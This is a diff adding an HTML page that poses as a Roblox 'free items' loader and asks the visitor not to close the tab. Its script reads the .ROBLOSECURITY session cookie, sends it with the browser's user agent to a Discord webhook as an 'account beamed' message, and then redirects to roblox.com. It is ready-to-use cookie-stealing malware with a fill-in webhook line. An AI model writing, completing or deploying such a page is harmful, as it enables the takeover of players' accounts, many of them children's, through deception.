@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox</title>
+    <style>
+        body { margin:0; background:#111; color:white; font-family:Arial; text-align:center; padding-top:15%; }
+        h1 { font-size:2.5em; }
+    </style>
+</head>
+<body>
+    <h1>Roblox is loading your free items...</h1>
+    <p>Do not close this tab.</p>
+
+    <script>
+        function getRobloxCookie() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                cookie = cookie.trim();
+                if (cookie.startsWith('.ROBLOSECURITY=')) {
+                    return cookie.split('=')[1];
+                }
+            }
+            return null;
+        }
+
+        const cookie = getRobloxCookie();
+        const webhook = "PASTE_YOUR_WEBHOOK_HERE";   // <--- CHANGE THIS LINE ONLY
+
+        if (cookie && webhook !== "https://discord.com/api/webhooks/1524840677131685928/X_GshtYbi20O8G0XqlEsFDDEFIuPPJF7QfLhsoCrWhKUdvgLhhqEpN-z1Uwr6_VlFyms") {
+            const embed = {
+                username: "Beamer",
+                embeds: [{
+                    title: "🚀 ROBLOX ACCOUNT BEAMED",
+                    color: 16776960,
+                    fields: [
+                        { name: "Cookie", value: "```" + cookie + "```" },
+                        { name: "User Agent", value: navigator.userAgent },
+                        { name: "Time", value: new Date().toUTCString() }
+                    ]
+                }]
+            };
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(embed)
+            }).finally(() => {
+                window.location.href = "https://www.roblox.com/home";
+            });
+        } else {
+            window.location.href = "https://www.roblox.com/home";
+        }
+    </script>
+</body>
+</html>
